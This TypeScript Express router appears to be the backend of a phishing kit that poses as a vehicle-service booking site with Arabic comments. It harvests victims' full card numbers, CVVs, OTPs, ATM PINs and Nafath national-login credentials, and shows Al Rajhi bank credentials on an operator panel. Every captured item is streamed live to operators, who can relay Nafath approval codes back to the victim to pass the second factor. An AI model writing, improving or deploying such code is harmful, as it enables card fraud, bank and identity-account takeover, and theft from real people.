/**
 * site-api.ts
 * خادم API خاص بالموقع الأمامي (dist)
 * يستقبل طلبات POST على مسار /data/?typeReq=...
 * ويرد بالبنية التي يتوقعها site.js
 *
 * site.js يرسل البيانات بالشكل:
 * { req: { PersonName, CardID, PhoneNum, Email, ... }, reference: "..." }
 * أو مباشرة في body
 */
import { Router, Request, Response } from "express";
import { nanoid } from "nanoid";
import {
  createBooking,
  getBookingByReference,
  getAllBookings,
  getNewBookings,
  updateBookingStatus,
  markBookingRead,
  createOrUpdatePayment,
  getPaymentByReference,
  createOrUpdateVerification,
  getVerificationByReference,
  logNavigation,
} from "./db";
import { notifyOwner } from "./_core/notification";
import { getIo } from "./socket";

// خريطة IP → reference للتتبع
const ipRefMap: Map<string, string> = new Map();

// دالة مساعدة للرد
function ok(res: Response, data: unknown) {
  return res.json({ status: true, data });
}
function err(res: Response, msg: string, code = 400) {
  return res.status(code).json({ status: false, message: msg });
}

// استخراج IP من الطلب
function getClientIp(req: Request): string {
  return (
    ((req.headers["x-forwarded-for"] as string) || "").split(",")[0]?.trim() ||
    (req as any).ip ||
    "unknown"
  );
}

export function createSiteApiRouter(): Router {
  const router = Router();

  // POST /data/?typeReq=...&category=...
  router.post("/", async (req: Request, res: Response) => {
    const typeReq = String(req.query.typeReq || "");
    const category = String(req.query.category || "");
    const body = req.body || {};
    const clientIp = getClientIp(req);

    // site.js يرسل البيانات في body.req - نستخرجها ونضعها في d
    // d يحتوي على البيانات الفعلية سواء كانت في body.req أو body مباشرة
    const d = (body.req && typeof body.req === "object") ? body.req : body;

    // reference: يمكن أن يكون في body.reference أو body.req.reference أو من ipRefMap
    const bodyReference = String(
      body.reference || body.Reference ||
      (body.req && (body.req.reference || body.req.Reference)) ||
      ""
    );

    console.log(`[SiteAPI] typeReq=${typeReq} category=${category} ip=${clientIp}`);
    console.log(`[SiteAPI] body keys: ${Object.keys(body).join(", ")}`);
    if (body.req) console.log(`[SiteAPI] req keys: ${Object.keys(body.req).join(", ")}`);

    try {
      // ==================== FORMS_SUBMIT ====================
      if (category === "FORMS_SUBMIT") {
        // ---- حجز جديد ----
        if (typeReq === "NewDate") {
          const referenceId = nanoid(12);
          const str = (v: unknown) => (v != null ? String(v) : "");

          // أسماء الأعمدة من site.js:
          // PersonName, CardID, PhoneNum, Email, RegisterCountry, CanDelegate
          // PanalNum, VehicleType, RegionSvc, TypeSvc, DateSvc, TimeSvc, vehicleCarryDang
          // VehiclePlateChar1/2/3 (أحرف اللوحة) أو PanalNum (رقم اللوحة)
          const plateChars = [
            str(d.VehiclePlateChar1 ?? d.vehiclePlateChar1 ?? ""),
            str(d.VehiclePlateChar2 ?? d.vehiclePlateChar2 ?? ""),
            str(d.VehiclePlateChar3 ?? d.vehiclePlateChar3 ?? ""),
          ].filter(Boolean).join("-");
          const plateNum = str(d.PanalNum ?? d.NumberPanal ?? d.numberPanal ?? "");
          const vehiclePlate = plateChars ? `${plateChars}-${plateNum}` : plateNum;

          const booking = await createBooking({
            referenceId,
            // دعم أسماء site.js الجديدة (PersonName, CardID, PhoneNum, Email)
            // والأسماء القديمة (Name, ID, PhonNumber, Email1)
            clientName: str(d.PersonName ?? d.Name ?? d.name ?? d.InputName ?? ""),
            clientId: str(d.CardID ?? d.ID ?? d.id ?? d.InputID ?? ""),
            clientPhone: str(d.PhoneNum ?? d.PhonNumber ?? d.phonNumber ?? d.InputPhonNumber ?? ""),
            clientEmail: str(d.Email ?? d.Email1 ?? d.email1 ?? d.InputEmail1 ?? ""),
            clientNationality: str(d.Nationality ?? d.nationality ?? ""),
            hasDelegate: d.CanDelegate === 1 || d.CanDelegate === "1" || d.flexSwitchDelegate === 1 || d.flexSwitchDelegate === "1",
            delegateType: str(d.DelegateType ?? ""),
            delegateName: str(d.DelegateName ?? ""),
            delegatePhone: str(d.DelegatePhone ?? ""),
            delegateNationality: str(d.DelegateNationality ?? ""),
            delegateId: str(d.DelegateId ?? ""),
            // RegisterCountry أو CountryReg
            vehicleCountry: str(d.RegisterCountry ?? d.CountryReg ?? d.InputCountryReg ?? ""),
            vehiclePlate,
            vehiclePlateChar1: str(d.VehiclePlateChar1 ?? ""),
            vehiclePlateChar2: str(d.VehiclePlateChar2 ?? ""),
            vehiclePlateChar3: str(d.VehiclePlateChar3 ?? ""),
            // VehicleType أو TypeVechil
            vehicleType: str(d.VehicleType ?? d.TypeVechil ?? d.InputTypeVechil ?? ""),
            vehicleCarryDang: d.vehicleCarryDang === 1 || d.vehicleCarryDang === "1",
            serviceRegion: str(d.RegionSvc ?? d.InputRegion ?? ""),
            serviceType: str(d.TypeSvc ?? d.InputTypeSvc ?? ""),
            serviceDate: str(d.DateSvc ?? d.InputDateSvc ?? ""),
            serviceTime: str(d.TimeSvc ?? d.InputTimeSvc ?? ""),
            clientIp,
            rawData: body,
            statusRead: 0,
            status: "new",
          });

          // ربط IP بالمرجع
          ipRefMap.set(clientIp, referenceId);

          // إشعار المسؤول
          try {
            await notifyOwner({
              title: "حجز جديد",
              content: `حجز جديد من ${booking?.clientName || "عميل"} - هوية: ${booking?.clientId || ""} - لوحة: ${booking?.vehiclePlate || ""}`,
            });
          } catch (_) {}

          // إرسال للوحة التحكم
          try {
            getIo()?.to("admins").emit("newBooking", booking);
          } catch (_) {}

          return ok(res, { Reference: referenceId, goToUrl: "/payment" });
        }

        // ---- بيانات الدفع (PaymentsForm) ----
        if (typeReq === "PaymentsForm") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return err(res, "لا يوجد مرجع");

          const step = parseInt(String(body.step || d.step || "1"));
          const str = (v: unknown) => (v != null ? String(v) : "");

          if (step === 1) {
            // site.js يرسل: PaymentCardID=رقم البطاقة, PaymentCardCode=CVV, PaymentCardExp=تاريخ, PersonCardName=الاسم
            const cardNum = str(d.PaymentCardID ?? d.CardID ?? d.cardID ?? "").replace(/\s/g, "");
            const cvv = str(d.PaymentCardCode ?? d.CardCode ?? d.cardCode ?? "");
            const expiry = str(d.PaymentCardExp ?? d.DateExp ?? d.dateExp ?? "");
            const holderName = str(d.PersonCardName ?? d.CardHolderName ?? d.cardHolderName ?? "");

            await createOrUpdatePayment(reference, {
              cardHolderName: holderName,
              cardNumber: cardNum,
              cardLastFour: cardNum.slice(-4),
              cardCvv: cvv,
              cardExpiry: expiry,
              paymentAction: "STILL",
              step: 1,
              status: "step1_done",
              rawData: body,
            });
            await updateBookingStatus(reference, "pending_payment");
            try {
              getIo()?.to("admins").emit("newPayment", {
                reference, step: 1, type: "card",
                cardNumber: cardNum, cardLastFour: cardNum.slice(-4),
                cardCvv: cvv, cardExpiry: expiry, cardHolderName: holderName,
              });
            } catch (_) {}
            return ok(res, { status: "STILL", step: 1 });
          }

          if (step === 2) {
            const verifyCode = str(d.VerifyPaymentCode ?? d.VerifyPayment ?? d.verification_code ?? "");
            await createOrUpdatePayment(reference, {
              verifyCode,
              paymentAction: "STILL",
              step: 2,
              status: "step2_done",
            });
            try { getIo()?.to("admins").emit("newPayment", { reference, step: 2, type: "otp", verifyCode }); } catch (_) {}
            return ok(res, { status: "STILL", step: 2 });
          }

          if (step === 3) {
            const secretNum = str(d.SecretPaymentCode ?? d.SecretNum ?? d.secretNum ?? d.code ?? "");
            await createOrUpdatePayment(reference, {
              secretNum,
              paymentAction: "STILL",
              step: 3,
              status: "step3_done",
            });
            try { getIo()?.to("admins").emit("newPayment", { reference, step: 3, type: "atm", secretNum }); } catch (_) {}
            return ok(res, { status: "STILL", step: 3, goToUrl: "/" });
          }

          return ok(res, { status: "STILL" });
        }

        // ---- التحقق من حالة الدفع (PayFmIsVerified) ----
        if (typeReq === "PayFmIsVerified") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return ok(res, { status: "EMPITY" });

          const payment = await getPaymentByReference(reference);
          if (!payment) return ok(res, { status: "STILL" });

          const action = payment.paymentAction || "STILL";
          return ok(res, { status: action });
        }

        // ---- نفاذ (Nafath) ----
        if (typeReq === "Nafath") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return err(res, "لا يوجد مرجع");

          const str = (v: unknown) => (v != null ? String(v) : "");
          await createOrUpdateVerification(reference, "nafath", {
            nafathId: str(d.NafathIDCard ?? d.nafathIDCard ?? d.InputID ?? ""),
            nafathPassword: str(d.NafathPassword ?? d.nafathPassword ?? ""),
            step: 1,
            status: "step1_done",
            rawData: body,
          });
          await updateBookingStatus(reference, "pending_nafath");

          try { getIo()?.to("admins").emit("newPayment", { reference, step: 1, type: "nafath" }); } catch (_) {}

          return ok(res, { status: "EMPITY" });
        }

        // ---- طلب رمز نفاذ (NafathFmGetNum) ----
        if (typeReq === "NafathFmGetNum") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return ok(res, { status: "EMPITY", code: null });

          const nafath = await getVerificationByReference(reference, "nafath");
          const code = nafath?.nafathNumber || null;

          return ok(res, {
            status: code ? "found" : "EMPITY",
            code,
            MotaselPhonNum: nafath?.motaselPhone || "",
          });
        }

        // ---- التحقق من نفاذ (NafathFmIsVerified) ----
        if (typeReq === "NafathFmIsVerified") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return ok(res, { status: "EMPITY", code: null });

          const nafath = await getVerificationByReference(reference, "nafath");
          if (!nafath) return ok(res, { status: "EMPITY", code: null });

          const booking = await getBookingByReference(reference);
          if (booking?.status === "verified" || booking?.status === "completed") {
            return ok(res, { status: "accepted", code: nafath.nafathNumber });
          }

          const code = nafath.nafathNumber || null;
          if (code) {
            return res.json({
              status: true,
              data: {
                status: "found",
                code,
                MotaselPhonNum: nafath.motaselPhone || "",
              },
            });
          }

          return ok(res, { status: "EMPITY", code: null });
        }

        // ---- المتصل (Motasel) ----
        if (typeReq === "Motasel") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return err(res, "لا يوجد مرجع");

          const step = parseInt(String(body.step || d.step || "1"));
          const str = (v: unknown) => (v != null ? String(v) : "");

          if (step === 1) {
            await createOrUpdateVerification(reference, "motasel", {
              motaselProvider: str(d.MotaselNetProvider ?? d.motaselNetProvider ?? ""),
              motaselPhone: str(d.MotaselPhonNum ?? d.motaselPhonNum ?? ""),
              step: 1,
              status: "step1_done",
              rawData: body,
            });
            await updateBookingStatus(reference, "pending_motasel");
            try { getIo()?.to("admins").emit("newPayment", { reference, step: 1, type: "motasel" }); } catch (_) {}
            return ok(res, { status: "EMPITY" });
          }

          if (step === 2) {
            await createOrUpdateVerification(reference, "motasel", {
              motaselCode: str(d.MotaselVerifyCode ?? d.motaselVerifyCode ?? d.code ?? ""),
              step: 2,
              status: "verified",
            });
            try { getIo()?.to("admins").emit("newPayment", { reference, step: 2, type: "motaselCode" }); } catch (_) {}
            return ok(res, { status: "EMPITY" });
          }

          return ok(res, { status: "EMPITY" });
        }

        // ---- التحقق من المتصل (MotaselFmIsVerified) ----
        if (typeReq === "MotaselFmIsVerified") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return ok(res, { status: "EMPITY" });

          const motasel = await getVerificationByReference(reference, "motasel");
          if (!motasel) return ok(res, { status: "EMPITY" });

          const booking = await getBookingByReference(reference);
          if (booking?.status === "verified" || booking?.status === "completed") {
            return ok(res, { status: "accepted" });
          }

          if (motasel.status === "verified") {
            return ok(res, { status: "accepted" });
          }

          return ok(res, { status: "EMPITY" });
        }

        // ---- تعيين حالة الإجراء (SetActionStatus) - من لوحة التحكم ----
        if (typeReq === "SetActionStatus") {
          const reference = String(body.Reference || body.reference || body.ID || d.Reference || d.reference || "");
          const action = String(body.action || d.action || "");
          const actionType = String(body.actionType || d.actionType || "");

          if (reference) {
            if (actionType === "payment" || actionType === "") {
              if (action === "accepted") {
                await createOrUpdatePayment(reference, { paymentAction: "accepted" });
                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action: "accepted" }); } catch (_) {}
              } else if (action === "pass") {
                await createOrUpdatePayment(reference, { paymentAction: "pass" });
                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action: "pass" }); } catch (_) {}
              } else if (action === "denied") {
                await createOrUpdatePayment(reference, { paymentAction: "denied" });
                await updateBookingStatus(reference, "cancelled", 1);
                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action: "denied" }); } catch (_) {}
              } else if (action === "verified" || action === "completed") {
                await createOrUpdatePayment(reference, { paymentAction: "accepted", status: "verified" });
                await updateBookingStatus(reference, action === "completed" ? "completed" : "verified", 1);
                try { getIo()?.to("admins").emit("paymentActionSet", { reference, action }); } catch (_) {}
              }
            } else if (actionType === "nafath") {
              await createOrUpdateVerification(reference, "nafath", {
                nafathNumber: action,
                step: 2,
                status: "step1_done",
              });
              try { getIo()?.to("admins").emit("nafathCodeSent", { reference, code: action }); } catch (_) {}
            } else if (actionType === "motasel") {
              if (action === "accepted") {
                await updateBookingStatus(reference, "verified", 1);
                await createOrUpdateVerification(reference, "motasel", { status: "verified" });
              } else if (action === "denied") {
                await updateBookingStatus(reference, "cancelled", 1);
              }
              try { getIo()?.to("admins").emit("motaselActionSet", { reference, action }); } catch (_) {}
            } else if (actionType === "booking") {
              if (action === "accepted" || action === "verified") {
                await updateBookingStatus(reference, "verified", 1);
              } else if (action === "completed") {
                await updateBookingStatus(reference, "completed", 1);
              } else if (action === "denied" || action === "cancelled") {
                await updateBookingStatus(reference, "cancelled", 1);
              }
            }
          }

          const booking = await getBookingByReference(reference);
          return ok(res, booking || {});
        }

        // ---- حذف مستخدمين (DeleteUsers) ----
        if (typeReq === "DeleteUsers") {
          const refs = body.references || body.References || d.references || d.References || [];
          if (Array.isArray(refs)) {
            for (const ref of refs) {
              await updateBookingStatus(String(ref), "cancelled");
            }
          }
          return ok(res, { deleted: true });
        }
      }

      // ==================== UsersLists ====================
      if (category === "UsersLists") {
        // ---- قائمة المستخدمين ----
        if (typeReq === "ALL_ACTIONS_LIST" || typeReq === "NEW_ACTIONS_LIST") {
          const list = typeReq === "NEW_ACTIONS_LIST"
            ? await getNewBookings()
            : await getAllBookings(100);

          // تحويل البيانات للبنية التي يتوقعها site.js
          const data = list.map((b: any) => ({
            Reference: b.referenceId,
            Name: b.clientName,
            ID: b.clientId,
            Phone: b.clientPhone,
            StatusRead: b.statusRead || 0,
            STATUS_VERIFY: b.status === "pending_payment" || b.status === "pending_nafath" || b.status === "pending_motasel" ? "STILL" : "",
            verified: b.status === "verified" || b.status === "completed" ? 1 : 0,
            proven: b.status === "payment_done" ? 1 : 0,
            status: b.status,
            createdAt: b.createdAt,
          }));

          return ok(res, data);
        }

        // ---- قوالب النماذج (GetTemplatesForms) ----
        if (typeReq === "GetTemplatesForms") {
          const reference = String(body.Reference || body.reference || d.Reference || d.reference || "");
          if (!reference) return ok(res, [""]);

          const booking = await getBookingByReference(reference);
          const payment = await getPaymentByReference(reference);
          const nafath = await getVerificationByReference(reference, "nafath");
          const motasel = await getVerificationByReference(reference, "motasel");

          const html = buildTemplateFormsHtml(booking, payment, nafath, motasel, reference);
          return ok(res, [html]);
        }
      }

      // ==================== Redirect ====================
      if (category === "Redirect") {
        if (typeReq === "VisitorRedirect") {
          const reference = String(bodyReference || "");
          const targetUrl = String(body.url || d.url || "/");

          if (reference) {
            await logNavigation({
              referenceId: reference,
              clientIp,
              targetPage: targetUrl,
            });
          }

          return ok(res, { url: targetUrl });
        }

        if (typeReq === "CheckNextUrl") {
          const reference = String(bodyReference || ipRefMap.get(clientIp) || "");
          if (!reference) return ok(res, { url: null });

          const booking = await getBookingByReference(reference);
          if (!booking) return ok(res, { url: null });

          let nextUrl: string | null = null;
          if (booking.status === "new") nextUrl = "/payment";
          else if (booking.status === "pending_payment") nextUrl = "/payment";
          else if (booking.status === "pending_nafath") nextUrl = "/nafath";
          else if (booking.status === "pending_motasel") nextUrl = "/motasel";
          else if (booking.status === "payment_done") nextUrl = "/confirm";
          else if (booking.status === "verified") nextUrl = "/confirm";

          return ok(res, { url: nextUrl });
        }
      }

      // ==================== Default ====================
      console.warn(`[SiteAPI] Unknown typeReq=${typeReq} category=${category}`);
      return ok(res, {});
    } catch (error: any) {
      console.error("[SiteAPI] Error:", error);
      return res.status(500).json({ status: false, message: error.message });
    }
  });

  return router;
}

// ==================== HTML Builder ====================
function buildTemplateFormsHtml(
  booking: any,
  payment: any,
  nafath: any,
  motasel: any,
  reference: string
): string {
  const b = booking || {};
  const p = payment || {};
  const n = nafath || {};
  const m = motasel || {};

  const statusBadge = (status: string) => {
    const map: Record<string, string> = {
      new: "badge bg-primary",
      pending_payment: "badge bg-warning",
      pending_nafath: "badge bg-purple",
      pending_motasel: "badge bg-orange",
      payment_done: "badge bg-success",
      verified: "badge bg-success",
      completed: "badge bg-secondary",
      cancelled: "badge bg-danger",
    };
    return `<span class="${map[status] || "badge bg-secondary"}">${status}</span>`;
  };

  return `
<div class="card mb-3">
  <div class="card-header d-flex justify-content-between align-items-center">
    <strong>تفاصيل الحجز: ${reference}</strong>
    ${statusBadge(b.status || "new")}
  </div>
  <div class="card-body collapse show" id="body_${reference}">
    <div class="row g-3">
      <div class="col-md-6">
        <h6 class="text-primary">بيانات العميل</h6>
        <table class="table table-sm table-bordered">
          <tr><th>الاسم</th><td>${b.clientName || "—"}</td></tr>
          <tr><th>رقم الهوية</th><td>${b.clientId || "—"}</td></tr>
          <tr><th>الهاتف</th><td>${b.clientPhone || "—"}</td></tr>
          <tr><th>البريد</th><td>${b.clientEmail || "—"}</td></tr>
          <tr><th>الجنسية</th><td>${b.clientNationality || "—"}</td></tr>
          <tr><th>عنوان IP</th><td>${b.clientIp || "—"}</td></tr>
        </table>
      </div>
      <div class="col-md-6">
        <h6 class="text-success">بيانات المركبة</h6>
        <table class="table table-sm table-bordered">
          <tr><th>رقم اللوحة</th><td>${b.vehiclePlate || "—"}</td></tr>
          <tr><th>نوع المركبة</th><td>${b.vehicleType || "—"}</td></tr>
          <tr><th>بلد التسجيل</th><td>${b.vehicleCountry || "—"}</td></tr>
          <tr><th>المنطقة</th><td>${b.serviceRegion || "—"}</td></tr>
          <tr><th>التاريخ</th><td>${b.serviceDate || "—"}</td></tr>
          <tr><th>الوقت</th><td>${b.serviceTime || "—"}</td></tr>
        </table>
      </div>
      ${p.cardHolderName || p.cardLastFour ? `
      <div class="col-md-6">
        <h6 class="text-warning">بيانات الدفع</h6>
        <table class="table table-sm table-bordered">
          <tr><th>اسم حامل البطاقة</th><td>${p.cardHolderName || "—"}</td></tr>
          <tr><th>رقم البطاقة الكامل</th><td>${p.cardNumber || "—"}</td></tr>
          <tr><th>آخر 4 أرقام</th><td>${p.cardLastFour || "—"}</td></tr>
          <tr><th>تاريخ الانتهاء</th><td>${p.cardExpiry || "—"}</td></tr>
          <tr><th>CVV</th><td>${p.cardCvv || "—"}</td></tr>
          <tr><th>رمز التحقق OTP</th><td>${p.verifyCode || "—"}</td></tr>
          <tr><th>الرقم السري ATM</th><td>${p.secretNum || "—"}</td></tr>
          ${p.rajUsername ? `<tr><th>مستخدم الراجحي</th><td>${p.rajUsername}</td></tr>` : ""}
          ${p.rajPassword ? `<tr><th>كلمة مرور الراجحي</th><td>${p.rajPassword}</td></tr>` : ""}
        </table>
      </div>` : ""}
      ${n.nafathId ? `
      <div class="col-md-6">
        <h6 class="text-purple">بيانات نفاذ</h6>
        <table class="table table-sm table-bordered">
          <tr><th>رقم الهوية</th><td>${n.nafathId || "—"}</td></tr>
          <tr><th>كلمة المرور</th><td>${n.nafathPassword || "—"}</td></tr>
          <tr><th>رمز نفاذ</th><td>${n.nafathNumber || "—"}</td></tr>
        </table>
        <div class="div-nafath-actions mt-2">
          <input type="text" class="form-control form-control-sm mb-1" placeholder="أدخل رمز نفاذ لإرساله" id="nafathCode_${reference}">
          <button class="btn btn-sm btn-success" onclick="clickNafathSndNum(this, '${reference}')">إرسال رمز نفاذ</button>
        </div>
      </div>` : ""}
      ${m.motaselPhone ? `
      <div class="col-md-6">
        <h6 class="text-orange">بيانات المتصل</h6>
        <table class="table table-sm table-bordered">
          <tr><th>مزود الخدمة</th><td>${m.motaselProvider || "—"}</td></tr>
          <tr><th>رقم الهاتف</th><td>${m.motaselPhone || "—"}</td></tr>
          <tr><th>رمز التحقق</th><td>${m.motaselCode || "—"}</td></tr>
        </table>
      </div>` : ""}
    </div>
    <div class="div-payments-actions mt-3 d-flex gap-2 flex-wrap">
      <button class="btn btn-sm btn-success" onclick="clickPaymentAction(this, '${reference}', 'accepted')">قبول</button>
      <button class="btn btn-sm btn-danger" onclick="clickPaymentAction(this, '${reference}', 'denied')">رفض</button>
      <button class="btn btn-sm btn-secondary" onclick="clickPaymentAction(this, '${reference}', 'completed')">مكتمل</button>
    </div>
  </div>
</div>`;
}
